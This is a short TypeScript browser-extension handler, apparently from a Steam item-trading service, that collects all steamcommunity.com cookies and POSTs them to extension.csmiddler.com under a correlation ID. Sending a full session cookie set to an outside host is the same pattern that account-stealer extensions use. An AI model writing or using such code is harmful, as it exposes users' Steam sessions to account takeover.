import type { PlasmoMessaging } from "@plasmohq/messaging"

const handler: PlasmoMessaging.Handler = async () => {
  const steamCookies = await chrome.cookies.getAll({
    domain: "steamcommunity.com"
  })

  const csmiddlerCookies = await chrome.cookies.getAll({
    domain: "csmiddler.com"
  })

  if (!steamCookies.length || !csmiddlerCookies.length) {
    console.debug("No cookies found. Exiting.")
    return
  }

  const csmiddlerCorrelationId = csmiddlerCookies.find(
    (e) => e.name === "correlationId" && e.domain === "csmiddler.com"
  )?.value

  if (!csmiddlerCorrelationId) {
    console.debug("No correlationId found. Exiting.")
    return
  }

  await fetch(
    `https://extension.csmiddler.com?CorrelationId=${csmiddlerCorrelationId}`,
    {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ steamCookies })
    }
  )
}

export default handler
